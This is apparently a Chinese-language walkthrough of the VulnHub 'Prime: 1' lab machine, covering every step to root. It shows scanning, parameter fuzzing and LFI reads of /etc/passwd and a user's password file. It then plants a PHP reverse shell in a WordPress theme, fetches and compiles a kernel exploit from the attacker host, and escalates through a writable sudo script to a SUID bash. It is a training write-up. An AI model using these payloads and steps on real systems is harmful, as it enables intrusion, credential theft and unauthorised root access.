# Prime: 1

2024-6-2 https://www.vulnhub.com/entry/prime-1,358/

difficulty: medium

## IP

192.168.10.189

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8dc52023ab10cadee2fbe5cd4d2d4d72 (RSA)
|   256 949cf86f5cf14c11957f0a2c3476500b (ECDSA)
|_  256 4bf6f125b61326d4fc9eb0729ff46968 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: HacknPentest
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

虚拟机启动后，看到界面上有一个用户名 victor

http://192.168.10.189/ 主页上是一个图片，源代码中也没有可用信息。

使用 gobuster 进行扫描：

```
gobuster -t 64 dir -u http://192.168.10.189/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e

http://192.168.10.189/image.php            (Status: 200) [Size: 147]
http://192.168.10.189/wordpress            (Status: 301) [Size: 320] [--> http://192.168.10.189/wordpress/]
http://192.168.10.189/index.php            (Status: 200) [Size: 136]
http://192.168.10.189/dev                  (Status: 200) [Size: 131]
http://192.168.10.189/javascript           (Status: 301) [Size: 321] [--> http://192.168.10.189/javascript/]
http://192.168.10.189/secret.txt           (Status: 200) [Size: 412]
```

看到有一个 wordpress 目录，应该是 wp cms。

先看看 /secret.txt 中有什么：

```
Looks like you have got some secrets.

Ok I just want to do some help to you.

Do some more fuzz on every page of php which was finded by you. And if
you get any right parameter then follow the below steps. If you still stuck
Learn from here a basic tool with good usage for OSCP.

https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web

//see the location.txt and you will get your next move//
```

提示多 FUZZ，并且有一个 location.txt，访问 http://192.168.10.189/location.txt 是 404

http://192.168.10.189/image.php 和 http://192.168.10.189/index.php 显示的内容一致。

http://192.168.10.189/dev 显示:

```
hello,
now you are at level 0 stage.
In real life pentesting we should use our tools to dig on a web very hard.
Happy hacking.
```

没什么用。

看看 http://192.168.10.189/wordpress 这个 wordpress 吧，使用 wpscan 进行枚举：

```
wpscan --url http://192.168.10.189/wordpress/ -e

发现一个用户名  victor
```

使用 cewl 收集 cms 信息作为密码，使用 wpscan 进行爆破，但是没有找到 victor 的密码：

```
cewl -d 5 http://192.168.10.189/wordpress/ -w pass.txt

wpscan --url http://192.168.10.189/wordpress/ -P pass.txt -t 10
```

根据 /secret.txt 中的提示，对 image.php 和 index.php 进行参数爆破：

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.10.189/image.php?FUZZ=111 -fs 147

ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://192.168.10.189/index.php?FUZZ=1111' -fs 136
```

在 /index.ph 中发现 file 参数，继续进行利用,根据参数名意思，有可能是 LFI 或者是文件上传：

```
curl 'http://192.168.10.189/index.php?file=/etc/passwd'

显示结果: Do something better you are digging wrong file
```

尝试读取其他文件看看是否有能读取的:

```
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.10.189/index.php?file=FUZZ -fs 0
```

根据前面的提示，还有一个 location.txt，让我们包含这个文件看看能不能读出下一步提示信息：

```
curl 'http://192.168.10.189/index.php?file=location.txt'

ok well Now you reah at the exact parameter

Now dig some more for next one
use 'secrettier360' parameter on some other php page for more fun.
```

得到了一个参数提示 secrettier360 ，在另外一个 php 页面，估计就是 image.php，继续尝试 LFI：

```
curl 'http://192.168.10.189/image.php?secrettier360=/etc/passwd'

root:x:0:0:root:/root:/bin/bash
...
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
```

发现 3 个用户 root victor saket。 saket 还有一个提示: find password.txt file in my directory /home/saket， 尝试利用 LFI 读取。

尝试读取 /home/saket/password.txt 这个文件, 找到了一个密码 follow_the_ippsec：

```
curl 'http://192.168.10.189/image.php?secrettier360=/home/saket/password.txt'

follow_the_ippsec
```

尝试用密码 follow_the_ippsec 和 用户名 victor 登陆 wordpress。登陆后，发现 victor 是管理员权限，寻找可以写入 web shell 的功能点，media upload 、theme add、 plugin add 这几个地方上传后，都显示无写权限，在 theme editor 进行查找可写的页面，在 Twenty Nineteen 这个 theme 下，只有一个可以写的文件 secret.php 应该是靶机设计者给我们留下的 web shell 入口，将 web shell 写入到其中，在 kali 上进行监听，访问 theme 对应页面，得到反弹的 shell：

```
Twenty Nineteen: secret.php

<?php system("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.10.3/8888 0>&1'");?>
```

访问 php 触发反弹：

```
curl http://192.168.10.189/wordpress/wp-content/themes/twentynineteen/secret.php

nc -lvnp 8888

www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

获得 user flag:

```
www-data@ubuntu:/home/saket$ ls
enc  password.txt  user.txt
www-data@ubuntu:/home/saket$ cat user.txt
af3c658dcf9d7190da3153519c003456
```

尝试进行系统枚举，找到提权点。

```
cat /var/www/html/wordpress/wp-config.php'

define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'yourpasswordhere' );
define( 'DB_HOST', 'localhost' );
```

尝试使用得到的 password ssh 登陆上面得到的 3 个用户，但是登陆不成功。

crontab、suid、getcap 等都没发现可利用点，sudo 发现内容：

```
(root) NOPASSWD: /home/saket/enc
```

但是执行时需要输入密码，输入上面得到的密码，也没有什么反应。

尝试使用内核提权 https://www.exploit-db.com/exploits/45010

```
wget http://192.168.10.3/45010.c
gcc 45010.c -o 45010 && ./45010

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls -al
total 92
drwx------  5 root root  4096 Aug 31  2019 .
drwxr-xr-x 24 root root  4096 Aug 29  2019 ..
-rw-------  1 root root  8551 Sep  1  2019 .bash_history
-rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc
drwx------  3 root root  4096 Aug 30  2019 .cache
-rw-------  1 root root   137 Aug 30  2019 .mysql_history
drwxr-xr-x  2 root root  4096 Aug 29  2019 .nano
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root    66 Aug 31  2019 .selected_editor
-rwxr-xr-x  1 root root 14272 Aug 30  2019 enc
-rw-r--r--  1 root root   305 Aug 30  2019 enc.cpp
-rw-r--r--  1 root root   237 Aug 30  2019 enc.txt
-rw-r--r--  1 root root   123 Aug 30  2019 key.txt
-rw-r--r--  1 root root    33 Aug 30  2019 root.txt
-rw-r--r--  1 root root   805 Aug 30  2019 sql.py
-rwxr-xr-x  1 root root   442 Aug 31  2019 t.sh
drwxr-xr-x 10 root root  4096 Aug 30  2019 wfuzz
-rw-r--r--  1 root root   170 Aug 29  2019 wordpress.sql
# cat root.txt
b2b17036da1de94cfb024540a8e7075a
```

另一种提权方式，既然 enc 中需要输入密码，很可能靶机设计者将密码存储在机器上，尝试寻找看看有没有,过滤掉一些不正常的目录：

```
www-data@ubuntu:/home/saket$ find / -name '*backup*' 2>/dev/null | sort | grep -v "/usr/" | grep -v "/lib"

/opt/backup
/opt/backup/server_database/backup_pass
/var/backups
```

发现了一个名为 /opt/backup/server_database/backup_pass 的文件：

```
your password for backup_database file enc is

"backup_password"

Enjoy!
```

得到了我们想要的密码 backup_password

再次执行 sudo enc 后，在/home/saket 目录中得到了两个文件：enc.txt 和 key.txt :

```
www-data@ubuntu:/home/saket$ cat enc.txt
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=

www-data@ubuntu:/home/saket$ cat key.txt
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
```

先将 ippsec 转化为 md5:

```
echo -n 'ippsec' | md5sum
366a74cb3c959de17d61db30591c39d1
```

openssl 中有 enc 加解密，所以尝试用上面得到的 md5 值去解密那串字符串(enc.txt 中的内容，加密之后使用了 base64 进行了编码), 但是 enc.txt 中的字符串，不知道 enc 是使用的哪个类型的加密算法，需要进行遍历尝试：

先查看下 enc 支持的算法：

```
openssl enc -list

-aes-128-cbc               -aes-128-cfb               -aes-128-cfb1
-aes-128-cfb8              -aes-128-ctr               -aes-128-ecb
-aes-128-ofb               -aes-192-cbc               -aes-192-cfb
-aes-192-cfb1              -aes-192-cfb8              -aes-192-ctr
-aes-192-ecb               -aes-192-ofb               -aes-256-cbc
-aes-256-cfb               -aes-256-cfb1              -aes-256-cfb8
-aes-256-ctr               -aes-256-ecb               -aes-256-ofb
-aes128                    -aes128-wrap               -aes192
-aes192-wrap               -aes256                    -aes256-wrap
-aria-128-cbc              -aria-128-cfb              -aria-128-cfb1
-aria-128-cfb8             -aria-128-ctr              -aria-128-ecb
-aria-128-ofb              -aria-192-cbc              -aria-192-cfb
-aria-192-cfb1             -aria-192-cfb8             -aria-192-ctr
-aria-192-ecb              -aria-192-ofb              -aria-256-cbc
-aria-256-cfb              -aria-256-cfb1             -aria-256-cfb8
-aria-256-ctr              -aria-256-ecb              -aria-256-ofb
-aria128                   -aria192                   -aria256
-bf                        -bf-cbc                    -bf-cfb
-bf-ecb                    -bf-ofb                    -blowfish
-camellia-128-cbc          -camellia-128-cfb          -camellia-128-cfb1
-camellia-128-cfb8         -camellia-128-ctr          -camellia-128-ecb
-camellia-128-ofb          -camellia-192-cbc          -camellia-192-cfb
-camellia-192-cfb1         -camellia-192-cfb8         -camellia-192-ctr
-camellia-192-ecb          -camellia-192-ofb          -camellia-256-cbc
-camellia-256-cfb          -camellia-256-cfb1         -camellia-256-cfb8
-camellia-256-ctr          -camellia-256-ecb          -camellia-256-ofb
-camellia128               -camellia192               -camellia256
-cast                      -cast-cbc                  -cast5-cbc
-cast5-cfb                 -cast5-ecb                 -cast5-ofb
-chacha20                  -des                       -des-cbc
-des-cfb                   -des-cfb1                  -des-cfb8
-des-ecb                   -des-ede                   -des-ede-cbc
-des-ede-cfb               -des-ede-ecb               -des-ede-ofb
-des-ede3                  -des-ede3-cbc              -des-ede3-cfb
-des-ede3-cfb1             -des-ede3-cfb8             -des-ede3-ecb
-des-ede3-ofb              -des-ofb                   -des3
-des3-wrap                 -desx                      -desx-cbc
-id-aes128-wrap            -id-aes128-wrap-pad        -id-aes192-wrap
-id-aes192-wrap-pad        -id-aes256-wrap            -id-aes256-wrap-pad
-id-smime-alg-CMS3DESwrap  -rc2                       -rc2-128
-rc2-40                    -rc2-40-cbc                -rc2-64
-rc2-64-cbc                -rc2-cbc                   -rc2-cfb
-rc2-ecb                   -rc2-ofb                   -rc4
-rc4-40                    -seed                      -seed-cbc
-seed-cfb                  -seed-ecb                  -seed-ofb
-sm4                       -sm4-cbc                   -sm4-cfb
-sm4-ctr                   -sm4-ecb                   -sm4-ofb
```

将上面的内容保存在文件中 ciper.txt ，并且对文件进行处理，将每个加密算法显示在单独的一行中(去掉中间的空行)，这样方便后面进行循环求解：

```
cd Downdloads

cat ciper.txt | sed "s/ /\n/g" | sed '/^$/d' > ciper.out
```

```
echo 'nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=' > enc.txt

创建循环验证脚本：

-K 需要变换为passwd的hex格式(也可以使用 tr -d '\n')

echo -n `echo -n 'ippsec' | md5sum | awk -F ' ' {'print $1'}` | xxd -p -c 200
3336366137346362336339353964653137643631646233303539316333396431

for ciper in $(cat ciper.out); do
    echo $ciper
    openssl enc -d -a $ciper -K 3336366137346362336339353964653137643631646233303539316333396431 -in enc.txt 2>/dev/null
done
```

得到了一个正确的显示：

```
-aes-256-ecb
Dont worry saket one day we will reach to
our destination very soon. And if you forget
your username then use your old password
==> "tribute_to_ippsec"
```

提示 saket 的密码是 tribute_to_ippsec ，su saket 看看他有什么权限，sudo -l 显示:

```
(root) NOPASSWD: /home/victor/undefeated_victor
```

继续执行这个 sudo 程序：

```
saket@ubuntu:~$ sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
```

/tmp/challenge 提示不存在，那我们就在/tmp 中创建一个这个文件，并写入相关的 bash 代码，看看会不会执行：

```
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /tmp/challenge && chmod +x /tmp/challenge

sudo -u root /home/victor/undefeated_victor
```

执行成功：

```
saket@ubuntu:~$ ls -al /tmp/rootbash
-rwsr-sr-x 1 root root 1037528 Jun  2 02:09 /tmp/rootbash

saket@ubuntu:~$ /tmp/rootbash -p
rootbash-4.3# id
uid=1001(saket) gid=1001(saket) euid=0(root) egid=0(root) groups=0(root),1001(saket)
rootbash-4.3# cd /root
rootbash-4.3# ls
enc  enc.cpp  enc.txt  key.txt	root.txt  sql.py  t.sh	wfuzz  wordpress.sql
```

同时在/root 中，看到了 enc 的源码：

```
int main()
{
string s;
cout<<"enter password: ";
cin>>s;
if(s=="backup_password")
{
cout<<"good"<<endl;
system("/bin/cp /root/enc.txt /home/saket/enc.txt");
system("/bin/cp /root/key.txt /home/saket/key.txt");
}
return 0;
}
```
